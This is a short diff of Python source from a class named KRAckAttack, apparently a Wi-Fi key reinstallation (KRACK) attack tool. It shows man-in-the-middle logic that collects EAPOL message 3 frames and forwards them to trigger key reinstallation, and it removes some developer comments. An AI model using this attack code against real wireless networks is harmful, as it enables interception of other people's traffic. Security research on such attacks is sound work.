@@ -298,8 +298,8 @@ class KRAckAttack():
 			log(DEBUG, "Storing msg1")
 			client.store_msg1(p)
 		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
+
 			client.add_if_new_msg3(p)
-			# !-- FIXME: timeout on the client side
 			if len(client.msg3s) >= 2:
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
@@ -430,8 +430,6 @@ class KRAckAttack():
 			if might_forward:
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
-					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
-					# !-- CHECK[ ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
 						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
